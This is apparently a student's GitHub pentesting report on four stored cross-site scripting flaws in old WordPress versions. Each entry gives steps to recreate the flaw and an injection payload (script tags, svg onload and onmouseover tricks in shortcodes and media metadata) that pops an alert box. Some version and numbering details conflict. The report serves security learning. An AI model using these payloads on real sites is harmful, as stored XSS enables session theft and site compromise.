# WebSecurity-WordPress

Time spent: 15 hours spent in total

> Objective: Find, analyze, recreate, and document **3 vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting via Media File Metadata
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version:4.7.3
  - [x] GIF Walkthrough: <img src="https://github.com/Rabia1995/WebSecurity-WordPress/blob/master/Exploit-1-Authenticated%20Cross-Site%20Scripting%20via%20Media%20File%20Metadata.gif" width="800">
  - [x] Steps to recreate: 
    - Upload a media file containing exploit in form of Metadata.
	  - If it doesn't contain Metadata already, we can add it in description of the media file on admin console.
	  - Add ```"filename </noscript><script>alert("Exploit 3 Successful");</script>"``` in the description including quotes.
	  - View attachment page and our alert box will pop up.

          
2. Vulnerability Name: Stored XSS through embedded URL
  - [x] Summary: Stored XSS through embedded URL
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.13
  - [x] GIF Walkthrough: <img src="https://github.com/Rabia1995/WebSecurity-WordPress/blob/master/Exploit-2-Embedded-Link.gif" width="800">
  - [x] Steps to recreate: 
    - make a post/page containing harmful embedded link such as: ```Being Hacked: [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(12341234)\x3e'][/embed] "```
        
3. (Required)WordPress 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.0
    - Fixed in version:4.2.1
  - [x] GIF Walkthrough:<img src="https://github.com/Rabia1995/WebSecurity-WordPress/blob/master/Exploit-3-Not-An-XSS-Attack.gif" width="800"> 
  - [x] Steps to recreate: 
    - Login as Admin
    - Make a new post
    - Type as text ```Link[caption width="1" caption='<a href="' ">]</a><a href="http://onmouseover='alert(1)'">HOVER OVER ME</a>```
    - Publish it and view the post

        
4. (Required) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  - [x] Summary: 
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version:4.2.2
  - [x] GIF Walkthrough: <img src="https://github.com/Rabia1995/WebSecurity-WordPress/blob/master/Exploit-4-XSS-Attack.gif" width="800">
  - [x] Steps to recreate: 
    - Login as Admin
    - Make a new post
    - Type as text ```<a href= "[caption code=">]</a><a title=" onmouseover=alert('Hello') ">link</a>```
    - Publish it and view the post
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2018] [Rabia Tariq]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
